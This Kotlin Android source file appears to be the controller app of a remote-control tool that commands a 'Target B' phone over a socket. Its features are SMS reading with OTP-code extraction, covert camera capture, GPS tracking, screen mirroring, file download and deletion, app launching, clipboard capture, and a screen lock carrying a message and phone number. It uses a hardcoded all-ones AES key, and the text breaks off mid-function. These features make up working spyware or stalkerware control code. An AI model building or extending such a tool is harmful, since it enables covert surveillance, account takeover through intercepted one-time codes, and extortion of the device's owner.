package com.example.controller

import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.os.Bundle
import android.os.Environment
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.combinedClickable
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.List
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.ConcurrentHashMap
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

class MainActivity : ComponentActivity() {

    private var server: AdminSocketServer? = null
    private var nsdManager: NsdManager? = null
    private var registrationListener: NsdManager.RegistrationListener? = null
    
    // Testing key: 32 bytes of '1' for AES-256
    private val secretKey = SecretKeySpec(ByteArray(32) { 1.toByte() }, "AES")

    private var lastReceivedClipboardText = ""
    private var clipboardManager: ClipboardManager? = null
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null

    // State holders
    private val isClientConnected = mutableStateOf(false)
    private val clientIp = mutableStateOf("Disconnected")
    private val terminalOutput = mutableStateOf("Terminal initialized. Waiting for connection...\n")
    private val fileList = mutableStateListOf<FileItem>()
    private val targetBattery = mutableStateOf("N/A")
    private val targetStorage = mutableStateOf("N/A")
    private val transferProgress = mutableStateOf("No active transfer")
    private val activeDownloadFiles = ConcurrentHashMap<String, ByteArrayOutputStream>()
    private val notificationsList = mutableStateListOf<String>()
    private val targetLatitude = mutableStateOf("Unknown")
    private val targetLongitude = mutableStateOf("Unknown")
    private val targetLocationAccuracy = mutableStateOf("N/A")
    private val isTargetRinging = mutableStateOf(false)
    private val capturedPhotoBitmap = mutableStateOf<Bitmap?>(null)
    private val isCaptureInProgress = mutableStateOf(false)
    private val cameraError = mutableStateOf<String?>(null)
    private val activePhotoDownload = ByteArrayOutputStream()
    private val smsList = mutableStateListOf<SmsItem>()
    private val isMirroringActive = mutableStateOf(false)
    private val mirroringFrameBitmap = mutableStateOf<Bitmap?>(null)
    private val installedAppsList = mutableStateListOf<AppItem>()
    private val showAppLauncherDialog = mutableStateOf(false)
    private val isDeviceLocked = mutableStateOf(false)

    // Current browsed directory path
    private val currentPathState = mutableStateOf("/storage/emulated/0")

    companion object {
        private const val SERVICE_TYPE = "_androidp2p._tcp"
        private const val PORT = 8080
    }

    @OptIn(ExperimentalFoundationApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        startSocketServer()
        registerNsdService()
        setupClipboardSync()

        setContent {
            var selectedTab by remember { mutableStateOf(0) }
            
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF0F0F14) // Premium Dark BG
                ) {
                    Column(modifier = Modifier.fillMaxSize()) {
                        // Header
                        HeaderComponent(isClientConnected.value, clientIp.value)
                        
                        // Tabs Navigation
                        TabNavigationBar(selectedTab) { selectedTab = it }
                        
                        // Tab Content
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .fillMaxWidth()
                                .padding(16.dp)
                        ) {
                            when (selectedTab) {
                                0 -> DashboardTab(
                                    isConnected = isClientConnected.value,
                                    battery = targetBattery.value, 
                                    storage = targetStorage.value, 
                                    transferStatus = transferProgress.value,
                                    latitude = targetLatitude.value,
                                    longitude = targetLongitude.value,
                                    accuracy = targetLocationAccuracy.value,
                                    isRinging = isTargetRinging.value,
                                    photoBitmap = capturedPhotoBitmap.value,
                                    isCaptureInProgress = isCaptureInProgress.value,
                                    cameraError = cameraError.value,
                                    isMirroring = isMirroringActive.value,
                                    mirrorBitmap = mirroringFrameBitmap.value,
                                    isLocked = isDeviceLocked.value,
                                    onRefreshInfo = { sendCommand("GET_DEVICE_INFO") },
                                    onGetClipboard = { sendCommand("CLIPBOARD_GET") },
                                    onSendClipboard = {
                                        val clip = clipboardManager?.primaryClip
                                        if (clip != null && clip.itemCount > 0) {
                                            val text = clip.getItemAt(0).text?.toString() ?: ""
                                            if (text.isNotEmpty()) {
                                                sendCommand("CLIPBOARD:$text")
                                            }
                                        }
                                    },
                                    onLocateDevice = { sendCommand("GET_LOCATION") },
                                    onToggleSiren = {
                                        if (isTargetRinging.value) {
                                            sendCommand("STOP_SIREN")
                                        } else {
                                            sendCommand("RING_SIREN")
                                        }
                                    },
                                    onCapturePhoto = { facing ->
                                        isCaptureInProgress.value = true
                                        cameraError.value = null
                                        sendCommand("TAKE_PHOTO:$facing")
                                    },
                                    onClearPhoto = {
                                        capturedPhotoBitmap.value = null
                                        cameraError.value = null
                                    },
                                    onToggleMirror = {
                                        if (isMirroringActive.value) {
                                            sendCommand("STOP_MIRROR")
                                        } else {
                                            sendCommand("START_MIRROR")
                                        }
                                    },
                                    onOpenAppLauncher = {
                                        showAppLauncherDialog.value = true
                                        sendCommand("GET_APPS")
                                    },
                                    onLockDevice = { msg, phone ->
                                        sendCommand("LOCK_SCREEN:$msg|$phone")
                                    },
                                    onUnlockDevice = {
                                        sendCommand("UNLOCK_SCREEN")
                                    }
                                )
                                1 -> FileExplorerTab(
                                    isClientConnected.value, 
                                    fileList,
                                    pathText = currentPathState.value,
                                    onPathChanged = { currentPathState.value = it },
                                    onBrowse = { path -> sendCommand("LIST_FILES:$path") },
                                    onDownload = { fileName, fullPath -> sendCommand("DOWNLOAD:$fullPath") },
                                    onUpload = { localPath -> uploadFile(localPath) },
                                    onDelete = { fullPath -> sendCommand("DELETE:$fullPath") },
                                    onCreateFolder = { folderName -> sendCommand("MKDIR:${currentPathState.value}/$folderName") }
                                )
                                2 -> NotificationsTab(
                                    isConnected = isClientConnected.value,
                                    notifications = notificationsList,
                                    smsList = smsList,
                                    onClearNotifications = { notificationsList.clear() },
                                    onClearSms = { smsList.clear() },
                                    onFetchSms = { sendCommand("FETCH_SMS") },
                                    onCopySms = { code ->
                                        try {
                                            val clipData = android.content.ClipData.newPlainText("OTP Code", code)
                                            clipboardManager?.setPrimaryClip(clipData)
                                            terminalOutput.value += "OTP Code copied to clipboard: $code\n"
                                        } catch (e: Exception) {
                                            // Ignore
                                        }
                                    }
                                )
                            }
                        }

                        if (showAppLauncherDialog.value) {
                            var searchQuery by remember { mutableStateOf("") }
                            val filteredApps = installedAppsList.filter { 
                                it.name.contains(searchQuery, ignoreCase = true) || 
                                it.packageName.contains(searchQuery, ignoreCase = true)
                            }
                            
                            AlertDialog(
                                onDismissRequest = { showAppLauncherDialog.value = false },
                                title = { Text("Remote App Launcher", color = Color.White) },
                                text = {
                                    Column(modifier = Modifier.fillMaxWidth().height(400.dp)) {
                                        BasicTextField(
                                            value = searchQuery,
                                            onValueChange = { searchQuery = it },
                                            textStyle = TextStyle(color = Color.Black, fontSize = 14.sp),
                                            modifier = Modifier
                                                .fillMaxWidth()
                                                .background(Color.White, RoundedCornerShape(4.dp))
                                                .border(1.dp, Color.Gray, RoundedCornerShape(4.dp))
                                                .padding(8.dp),
                                            decorationBox = { innerTextField ->
                                                if (searchQuery.isEmpty()) {
                                                    Text("Search Apps...", color = Color.Gray)
                                                }
                                                innerTextField()
                                            }
                                        )
                                        Spacer(modifier = Modifier.height(12.dp))
                                        
                                        if (filteredApps.isEmpty()) {
                                            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                                Text(if (installedAppsList.isEmpty()) "Loading apps list..." else "No apps match search", color = Color.Gray)
                                            }
                                        } else {
                                            LazyColumn(modifier = Modifier.weight(1f)) {
                                                items(filteredApps) { app ->
                                                    Row(
                                                        modifier = Modifier
                                                            .fillMaxWidth()
                                                            .padding(vertical = 8.dp),
                                                        horizontalArrangement = Arrangement.SpaceBetween,
                                                        verticalAlignment = Alignment.CenterVertically
                                                    ) {
                                                        Column(modifier = Modifier.weight(1f)) {
                                                            Text(app.name, fontWeight = FontWeight.Bold, color = Color.White, fontSize = 14.sp)
                                                            Text(app.packageName, color = Color.Gray, fontSize = 11.sp)
                                                        }
                                                        Button(
                                                            onClick = {
                                                                sendCommand("LAUNCH_APP:${app.packageName}")
                                                                showAppLauncherDialog.value = false
                                                            },
                                                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE)),
                                                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 0.dp),
                                                            modifier = Modifier.height(30.dp)
                                                        ) {
                                                            Text("Launch", fontSize = 11.sp)
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                },
                                confirmButton = {
                                    Button(onClick = { showAppLauncherDialog.value = false }) {
                                        Text("Close")
                                    }
                                }
                            )
                        }
                    }
                }
            }
        }
    }

    private fun startSocketServer() {
        server = AdminSocketServer(
            port = PORT,
            secretKey = secretKey,
            onMessageReceived = { message ->
                runOnUiThread {
                    handleIncomingMessage(message)
                }
            },
            onClientConnected = { ip ->
                runOnUiThread {
                    isClientConnected.value = true
                    clientIp.value = ip
                    terminalOutput.value += "Target connected from $ip\n"
                    sendCommand("PING")
                }
            },
            onClientDisconnected = {
                runOnUiThread {
                    isClientConnected.value = false
                    clientIp.value = "Disconnected"
                    terminalOutput.value += "Target client disconnected.\n"
                    fileList.clear()
                    targetBattery.value = "N/A"
                    targetStorage.value = "N/A"
                    transferProgress.value = "No active transfer"
                }
            }
        )
        server?.start()
    }

    private fun setupClipboardSync() {
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            val clipData = clipboardManager?.primaryClip
            if (clipData != null && clipData.itemCount > 0) {
                val text = clipData.getItemAt(0).text?.toString()
                if (text != null && text.isNotEmpty() && text != lastReceivedClipboardText) {
                    sendCommand("CLIPBOARD:$text")
                }
            }
        }
        clipboardManager?.addPrimaryClipChangedListener(clipboardListener)
    }

    private fun registerNsdService() {
        nsdManager = getSystemService(Context.NSD_SERVICE) as NsdManager
        
        val serviceInfo = NsdServiceInfo().apply {
            serviceName = "AndroidP2PController"
            serviceType = SERVICE_TYPE
            port = PORT
        }

        registrationListener = object : NsdManager.RegistrationListener {
            override fun onServiceRegistered(NsdServiceInfo: NsdServiceInfo?) {}
            override fun onRegistrationFailed(serviceInfo: NsdServiceInfo?, errorCode: Int) {}
            override fun onServiceUnregistered(serviceInfo: NsdServiceInfo?) {}
            override fun onUnregistrationFailed(serviceInfo: NsdServiceInfo?, errorCode: Int) {}
        }

        try {
            nsdManager?.registerService(serviceInfo, NsdManager.PROTOCOL_DNS_SD, registrationListener)
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun sendCommand(command: String) {
        if (isClientConnected.value) {
            if (!command.startsWith("FILE_CHUNK_UPLOAD")) {
                terminalOutput.value += "> $command\n"
            }
            CoroutineScope(Dispatchers.IO).launch {
                server?.sendMessage(command)
            }
        } else {
            terminalOutput.value += "Error: No target device connected.\n"
        }
    }

    private fun handleIncomingMessage(message: String) {
        when {
            message == "PONG" -> {
                terminalOutput.value += "< PONG (Keep-alive verified)\n"
                sendCommand("GET_DEVICE_INFO")
            }
            message.startsWith("DEVICE_INFO:") -> {
                val info = message.substringAfter("DEVICE_INFO:").split(":")
                if (info.size >= 2) {
                    targetBattery.value = info[0]
                    targetStorage.value = info[1]
                }
            }
            message.startsWith("LOCATION:") -> {
                val parts = message.substringAfter("LOCATION:").split(":")
                if (parts.size >= 3) {
                    targetLatitude.value = parts[0]
                    targetLongitude.value = parts[1]
                    targetLocationAccuracy.value = "${parts[2]} meters"
                }
            }
            message.startsWith("LOCATION_ERROR:") -> {
                val error = message.substringAfter("LOCATION_ERROR:")
                targetLatitude.value = "Error"
                targetLongitude.value = "Error"
                targetLocationAccuracy.value = error
            }
            message.startsWith("SIREN_STATUS:") -> {
                val status = message.substringAfter("SIREN_STATUS:")
                isTargetRinging.value = (status == "ringing")
            }
            message.startsWith("MIRROR_STATUS:") -> {
                val status = message.substringAfter("MIRROR_STATUS:")
                isMirroringActive.value = (status == "active")
                if (status == "inactive") {
                    mirroringFrameBitmap.value = null
                }
            }
            message.startsWith("LOCK_STATUS:") -> {
                val status = message.substringAfter("LOCK_STATUS:")
                isDeviceLocked.value = (status == "locked")
            }
            message.startsWith("APPS_LIST:") -> {
                val jsonString = message.substringAfter("APPS_LIST:")
                try {
                    val arr = JSONArray(jsonString)
                    val list = mutableListOf<AppItem>()
                    for (i in 0 until arr.length()) {
                        val obj = arr.getJSONObject(i)
                        val name = obj.optString("name", "Unknown")
                        val pkg = obj.optString("package", "")
                        list.add(AppItem(name, pkg))
                    }
                    list.sortBy { it.name.lowercase() }
                    installedAppsList.clear()
                    installedAppsList.addAll(list)
                    terminalOutput.value += "Apps list fetched successfully. Total: ${list.size}\n"
                } catch (e: Exception) {
                    terminalOutput.value += "Error parsing apps list: ${e.message}\n"
                }
            }
            message.startsWith("LAUNCH_STATUS:") -> {
                terminalOutput.value += "App launched successfully on Target device.\n"
            }
            message.startsWith("LAUNCH_ERROR:") -> {
                val err = message.substringAfter("LAUNCH_ERROR:")
                terminalOutput.value += "Launch failed: $err\n"
            }
            message.startsWith("SCREEN_FRAME:") -> {
                val base64 = message.substringAfter("SCREEN_FRAME:")
                try {
                    val bytes = android.util.Base64.decode(base64, android.util.Base64.NO_WRAP)
                    val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    mirroringFrameBitmap.value = bitmap
                    isMirroringActive.value = true
                } catch (e: Exception) {
                    // Ignore
                }
            }
            message.startsWith("SCREEN_ERROR:") -> {
                val err = message.substringAfter("SCREEN_ERROR:")
                isMirroringActive.value = false
                mirroringFrameBitmap.value = null
                terminalOutput.value += "Screen mirroring error: $err\n"
            }
            message.startsWith("SMS_RECEIVED:") -> {
                val parts = message.substringAfter("SMS_RECEIVED:").split(":", limit = 2)
                if (parts.size == 2) {
                    val sender = parts[0]
                    val body = parts[1]
                    val code = extractOtpCode(body)
                    smsList.add(0, SmsItem(sender, body, code != null, code))
                    terminalOutput.value += "SMS received from $sender: $body\n"
                }
            }
            message.startsWith("SMS_HISTORY:") -> {
                val jsonString = message.substringAfter("SMS_HISTORY:")
                try {
                    val arr = JSONArray(jsonString)
                    smsList.clear()
                    for (i in 0 until arr.length()) {
                        val obj = arr.getJSONObject(i)
                        val sender = obj.optString("sender", "Unknown")
                        val body = obj.optString("body", "")
                        val code = extractOtpCode(body)
                        smsList.add(SmsItem(sender, body, code != null, code))
                    }
                    terminalOutput.value += "SMS history refreshed. Retrieved ${arr.length()} messages.\n"
                } catch (e: Exception) {
                    terminalOutput.value += "Error parsing SMS history: ${e.message}\n"
                }
            }
            message.startsWith("PHOTO_CHUNK:") -> {
                val parts = message.substringAfter("PHOTO_CHUNK:").split(":", limit = 3)
                if (parts.size == 3) {
                    val index = parts[0].toInt()
                    val total = parts[1].toInt()
                    val base64Data = parts[2]
                    try {
                        val chunkBytes = android.util.Base64.decode(base64Data, android.util.Base64.NO_WRAP)
                        activePhotoDownload.write(chunkBytes)
                        transferProgress.value = "Receiving photo: ${index + 1}/$total..."
                        
                        if (index == total - 1) {
                            val bytes = activePhotoDownload.toByteArray()
                            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                            capturedPhotoBitmap.value = bitmap
                            isCaptureInProgress.value = false
                            transferProgress.value = "Photo captured successfully!"
                            activePhotoDownload.reset()
                        }
                    } catch (e: Exception) {
                        isCaptureInProgress.value = false
                        cameraError.value = "Decode error: ${e.message}"
                        transferProgress.value = "Photo decode failed!"
                        activePhotoDownload.reset()
                    }
                }
            }
            message.startsWith("PHOTO_ERROR:") -> {
                val err = message.substringAfter("PHOTO_ERROR:")
                cameraError.value = err
                isCaptureInProgress.value = false
                transferProgress.value = "Photo capture failed!"
            }
            message.startsWith("LIST_FILES_JSON:") -> {
                val jsonString = message.substringAfter("LIST_FILES_JSON:")
                parseFileListJson(jsonString)
            }
            message.startsWith("CLIPBOARD:") -> {
                val text = message.substringAfter("CLIPBOARD:")
                lastReceivedClipboardText = text
                try {
                    val clipData = android.content.ClipData.newPlainText("P2P Clipboard", text)
                    clipboardManager?.setPrimaryClip(clipData)
                    terminalOutput.value += "Clipboard synchronized from B: $text\n"
                } catch (e: Exception) {
                    // Ignore
                }
            }
            message.startsWith("NOTIFICATION:") -> {
                val notifText = message.substringAfter("NOTIFICATION:")
                notificationsList.add(0, notifText)
                terminalOutput.value += "Notification: $notifText\n"
            }
            message.startsWith("SHELL_OUTPUT:") -> {
                val output = message.substringAfter("SHELL_OUTPUT:")
                terminalOutput.value += "Shell output:\n$output\n"
            }
            message.startsWith("FILE_CHUNK_DOWNLOAD:") -> {
                val parts = message.substringAfter("FILE_CHUNK_DOWNLOAD:").split(":", limit = 4)
                if (parts.size == 4) {
                    val fileName = parts[0]
                    val chunkIndex = parts[1].toInt()
                    val totalChunks = parts[2].toInt()
                    val base64Data = parts[3]
                    handleDownloadChunk(fileName, chunkIndex, totalChunks, base64Data)
                }
            }
            message.startsWith("UPLOAD_PROGRESS:") -> {
                val parts = message.substringAfter("UPLOAD_PROGRESS:").split(":")
                if (parts.size == 3) {
                    val fileName = parts[0]
                    val current = parts[1].toInt() + 1
                    val total = parts[2].toInt()
                    transferProgress.value = "Uploading $fileName: $current/$total chunks..."
                }
            }
            message.startsWith("UPLOAD_SUCCESS:") -> {
                val details = message.substringAfter("UPLOAD_SUCCESS:")
                transferProgress.value = "Upload complete!"
                terminalOutput.value += "$details\n"
                // Refresh folder content
                sendCommand("LIST_FILES:${currentPathState.value}")
            }
            message.startsWith("UPLOAD_ERROR:") -> {
                val err = message.substringAfter("UPLOAD_ERROR:")
                transferProgress.value = "Upload failed!"
                terminalOutput.value += "Error from Target B: $err\n"
            }
            message.startsWith("DOWNLOAD_ERROR:") -> {
                val err = message.substringAfter("DOWNLOAD_ERROR:")
                transferProgress.value = "Download failed!"
                terminalOutput.value += "Error from Target B: $err\n"
            }
            message.startsWith("DELETE_RESULT:") -> {
                val parts = message.substringAfter("DELETE_RESULT:").split(":")
                val fileName = parts[0]
                val success = parts.getOrNull(1) ?: "unknown"
                terminalOutput.value += "Delete file $fileName result: $success\n"
                // Refresh folder content
                sendCommand("LIST_FILES:${currentPathState.value}")
            }
            message.startsWith("MKDIR_RESULT:") -> {
                val parts = message.substringAfter("MKDIR_RESULT:").split(":")
                val folderName = parts[0]
                val success = parts.getOrNull(1) ?: "unknown"
                terminalOutput.value += "Create folder $folderName result: $success\n"
                // Refresh folder content
                sendCommand("LIST_FILES:${currentPathState.value}")
            }
            else -> {
                terminalOutput.value += "$message\n"
                if (message.contains("total") || message.contains("-r") || message.contains("drw") || message.split("\\s+".toRegex()).size >= 8) {
                    parseFileList(message)
                }
            }
        }
    }

    private fun parseFileListJson(jsonString: String) {
        fileList.clear()
        try {
            if (jsonString.trim().startsWith("{")) {
                val errObj = JSONObject(jsonString)
                if (errObj.has("status") && errObj.getString("status") == "error") {
                    terminalOutput.value += "Error: ${errObj.getString("message")}\n"
                    return
                }
            }
            val jsonArray = JSONArray(jsonString)
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                val name = obj.getString("name")
                val isDir = obj.getBoolean("isDirectory")
                val size = obj.getString("size")
                val fullPath = obj.getString("fullPath")
                fileList.add(FileItem(name, isDir, size, fullPath))
            }
        } catch (e: Exception) {
            terminalOutput.value += "JSON Parsing Error: ${e.message}\n"
        }
    }

    private fun handleDownloadChunk(fileName: String, chunkIndex: Int, totalChunks: Int, base64Data: String) {
        try {
            val chunkBytes = android.util.Base64.decode(base64Data, android.util.Base64.NO_WRAP)
            val stream = activeDownloadFiles.getOrPut(fileName) { ByteArrayOutputStream() }
            stream.write(chunkBytes)
            
            val current = chunkIndex + 1
            transferProgress.value = "Downloading $fileName: $current/$totalChunks chunks..."
            
            if (chunkIndex == totalChunks - 1) {
                val fileBytes = stream.toByteArray()
                val downloadDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                val destFile = File(downloadDir, fileName)
                destFile.writeBytes(fileBytes)
                
                activeDownloadFiles.remove(fileName)
                transferProgress.value = "Download complete!"
                terminalOutput.value += "File downloaded successfully to ${destFile.absolutePath}\n"
            }
        } catch (e: Exception) {
            transferProgress.value = "Download error!"
            terminalOutput.value += "Download Error: ${e.message}\n"
            activeDownloadFiles.remove(fileName)
        }
    }

    private fun uploadFile(localPath: String) {
        val file = File(localPath)
        if (!file.exists() || file.isDirectory) {
            terminalOutput.value += "Upload Error: Local file not found at $localPath\n"
            return
        }
        
        thread {
            try {
                val fileBytes = file.readBytes()
                val chunkSize = 256 * 1024 // 256KB chunks
                val totalChunks = kotlin.math.ceil(fileBytes.size.toDouble() / chunkSize).toInt()
                
                for (i in 0 until totalChunks) {
                    val start = i * chunkSize
                    val end = kotlin.math.min(start + chunkSize, fileBytes.size)
                    val chunk = fileBytes.copyOfRange(start, end)
                    val base64Data = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
                    
                    sendCommand("FILE_CHUNK_UPLOAD:${file.name}:$i:$totalChunks:$base64Data")
                    Thread.sleep(50) // Prevent queue congestion
                }
            } catch (e: Exception) {
                runOnUiThread {
                    terminalOutput.value += "Upload Error: ${e.message}\n"
                }
            }
        }
    }

    private fun parseFileList(rawLsOutput: String) {
        fileList.clear()
        val lines = rawLsOutput.split("\n")
        var currentPath = ""
        for (line in lines) {
            if (line.trim().isEmpty()) continue
            if (line.startsWith("/")) {
                currentPath = line.trim().removeSuffix(":")
                continue
            }
            if (line.startsWith("total")) continue
            val parts = line.split("\\s+".toRegex())
            if (parts.size >= 8) {
                val name = parts.subList(8, parts.size).joinToString(" ")
                val isDir = line.startsWith("d")
                val size = parts[4]
                val fullPath = if (currentPath.endsWith("/")) "$currentPath$name" else "$currentPath/$name"
                fileList.add(FileItem(name, isDir, size, fullPath))
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        server?.stop()
        try {
            nsdManager?.unregisterService(registrationListener)
        } catch (e: Exception) {
            // Ignore
        }
        try {
            clipboardListener?.let { clipboardManager?.removePrimaryClipChangedListener(it) }
        } catch (e: Exception) {
            // Ignore
        }
    }
}

// Data models
data class FileItem(val name: String, val isDirectory: Boolean, val size: String, val fullPath: String)

// Compose components
@Composable
fun HeaderComponent(isConnected: Boolean, clientIp: String) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(16.dp),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF161622)),
        shape = RoundedCornerShape(16.dp)
    ) {
        Row(
            modifier = Modifier
                .padding(16.dp)
                .fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column {
                Text(
                    text = "P2P Command Center",
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
                Text(
                    text = if (isConnected) "Connected to: $clientIp" else "Searching for Target B...",
                    fontSize = 13.sp,
                    color = if (isConnected) Color(0xFF00FFCC) else Color(0xFFFFB300)
                )
            }
            Box(
                modifier = Modifier
                    .size(12.dp)
                    .clip(RoundedCornerShape(6.dp))
                    .background(if (isConnected) Color(0xFF00FFCC) else Color(0xFFFF3366))
            )
        }
    }
}

@Composable
fun TabNavigationBar(selectedTab: Int, onTabSelected: (Int) -> Unit) {
    val items = listOf(
        TabItem("Dashboard", Icons.Default.Info),
        TabItem("Files", Icons.Default.List),
        TabItem("Logs & SMS", Icons.Default.Notifications)
    )
    
    TabRow(
        selectedTabIndex = selectedTab,
        containerColor = Color(0xFF0F0F14),
        contentColor = Color.White
    ) {
        items.forEachIndexed { index, item ->
            Tab(
                selected = selectedTab == index,
                onClick = { onTabSelected(index) },
                icon = { Icon(item.icon, contentDescription = item.title) },
                text = { Text(item.title, fontSize = 12.sp) }
            )
        }
    }
}

data class TabItem(val title: String, val icon: ImageVector)

@Composable
fun DashboardTab(
    isConnected: Boolean,
    battery: String,
    storage: String,
    transferStatus: String,
    latitude: String,
    longitude: String,
    accuracy: String,
    isRinging: Boolean,
    photoBitmap: Bitmap?,
    isCaptureInProgress: Boolean,
    cameraError: String?,
    isMirroring: Boolean,
    mirrorBitmap: Bitmap?,
    isLocked: Boolean,
    onRefreshInfo: () -> Unit,
    onGetClipboard: () -> Unit,
    onSendClipboard: () -> Unit,
    onLocateDevice: () -> Unit,
    onToggleSiren: () -> Unit,
    onCapturePhoto: (String) -> Unit,
    onClearPhoto: () -> Unit,
    onToggleMirror: () -> Unit,
    onOpenAppLauncher: () -> Unit,
    onLockDevice: (String, String) -> Unit,
    onUnlockDevice: () -> Unit
) {
    val context = LocalContext.current
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
    ) {
        Text("Target Device Status", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White)
        Spacer(modifier = Modifier.height(16.dp))
        
        StatusCard("Battery Level", battery, Color(0xFF4CAF50))
        Spacer(modifier = Modifier.height(12.dp))
        StatusCard("Storage Space", storage, Color(0xFF2196F3))
        Spacer(modifier = Modifier.height(12.dp))
        StatusCard("File Transfer Status", transferStatus, Color(0xFFFF9800))
        Spacer(modifier = Modifier.height(12.dp))
        
        // Location Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF161622))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Device Location", color = Color(0xFF888888), fontSize = 12.sp)
                        if (latitude != "Unknown" && latitude != "Error") {
                            Text("Lat: $latitude, Lng: $longitude", color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                            Text("Accuracy: $accuracy", color = Color.Gray, fontSize = 11.sp)
                        } else {
                            Text(if (latitude == "Error") "Location Error: $accuracy" else "Location: Unknown", color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Box(
                        modifier = Modifier
                            .size(8.dp)
                            .clip(RoundedCornerShape(4.dp))
                            .background(if (latitude != "Unknown" && latitude != "Error") Color(0xFF00E676) else Color(0xFFFF3D00))
                    )
                }
                
                if (latitude != "Unknown" && latitude != "Error") {
                    Spacer(modifier = Modifier.height(12.dp))
                    Button(
                        onClick = {
                            try {
                                val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com/maps/search/?api=1&query=$latitude,$longitude"))
                                context.startActivity(intent)
                            } catch (e: Exception) {
                                // Ignore
                            }
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E676), contentColor = Color.Black)
                    ) {
                        Text("View on Google Maps", fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
        
        // Camera Capture Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(top = 12.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF161622))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("Remote Camera Control", color = Color(0xFF888888), fontSize = 12.sp)
                Spacer(modifier = Modifier.height(8.dp))
                
                if (isCaptureInProgress) {
                    Box(modifier = Modifier.fillMaxWidth().height(150.dp), contentAlignment = Alignment.Center) {
                        CircularProgressIndicator(color = Color(0xFF00E676))
                    }
                } else if (photoBitmap != null) {
                    Image(
                        bitmap = photoBitmap.asImageBitmap(),
                        contentDescription = "Captured Photo",
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(240.dp)
                            .clip(RoundedCornerShape(8.dp))
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Button(
                        onClick = onClearPhoto,
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Gray)
                    ) {
                        Text("Close Photo", color = Color.White)
                    }
                } else {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(100.dp)
                            .background(Color(0xFF0F0F14), RoundedCornerShape(8.dp))
                            .border(1.dp, Color(0xFF2D2D3D), RoundedCornerShape(8.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(
                            text = if (cameraError != null) "Error: $cameraError" else "No captured photo yet",
                            color = if (cameraError != null) Color(0xFFFF1744) else Color.Gray,
                            fontSize = 13.sp
                        )
                    }
                }
                
                if (!isCaptureInProgress && photoBitmap == null) {
                    Spacer(modifier = Modifier.height(12.dp))
                    Row(modifier = Modifier.fillMaxWidth()) {
                        Button(
                            onClick = { onCapturePhoto("front") },
                            enabled = isConnected,
                            modifier = Modifier.weight(1f),
